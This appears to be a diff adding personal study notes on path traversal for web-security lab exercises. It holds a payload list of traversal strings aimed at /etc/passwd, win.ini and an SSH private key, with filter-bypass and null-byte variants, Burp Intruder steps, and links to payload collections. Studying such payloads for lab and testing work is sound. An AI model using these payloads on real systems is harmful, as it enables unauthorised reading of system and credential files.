@@ -1,0 +1,43 @@
+Path Traversal: Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. 
+
+Payload:
+/var/www/images/218.png
+/var/www/images/../../../etc/passwd
+/etc/passwd
+https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
+file=../../etc/passwd
+file=..././..././etc/passwd
+file=..;/..;/etc/passwd
+/home/user/ssh/id_rsa
+....//....//....//etc/passwd
+
+Lab: File path traversal, simple case:
+--> Enable Intercept Server Response
+--> Always see proxy >> http history
+--> Change the filter
+--> Go to response and see the content length
+--> send to file intruder and select the payload list
+--> paste the payload and attack
+--> some time can be use url encoding or other encoding method
+
+Payload:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
+https://github.com/payloadbox/directory-payload-list.git
+https://freedium.cfd/https://medium.com/@suprajabaskaran8/cheat-sheet-for-path-traversal-payloads-579f1e71eae9
+https://book.hacktricks.xyz/pentesting-web/file-inclusion
+https://gist.github.com/tarcisio-marinho/9db3fadef97f965aa564032b26d14d7c
+https://raw.githubusercontent.com/InfoSecWarrior/Offensive-Payloads/main/Directory-Traversal-Payloads.txt
+
+Lab: File path traversal, traversal sequences blocked with absolute path bypass:
+--> Same road than previous
+
+File path traversal, traversal sequences stripped non-recursively: 
+--> Use double ....//....//
+
+Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+--> some time can be use url encoding or other encoding method
+
+Lab: File path traversal, validation of start of path:
+--> try to use null byte ../../../etc/passwd%00.png
+
+
